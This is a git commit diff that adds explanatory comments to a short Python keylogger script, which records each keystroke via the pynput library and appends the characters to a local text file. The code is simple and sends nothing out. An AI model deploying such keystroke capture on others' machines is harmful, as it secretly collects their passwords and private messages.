f4d0142d9afe9e137b045776f0607c810ea3f1c9
amirakhwand <122045078+amirakhwand@users.noreply.github.com>
2023-01-05 12:34:55 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,11 +1,20 @@
+"""This script tracks clicks on the keyboard and creates a txt file to track
+every keystroke"""
+
+#imports the keyboard function from the pynput library
 from pynput import keyboard
 
+
+#defining the keypressed function
 def keyPressed(key):
     print(str(key))
+    #create a text file named keyfile.txt
     with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
             logKey.write(char)
+
+            #if an issue comes up, print this message
         except:
             print("Error getting the characters")
 
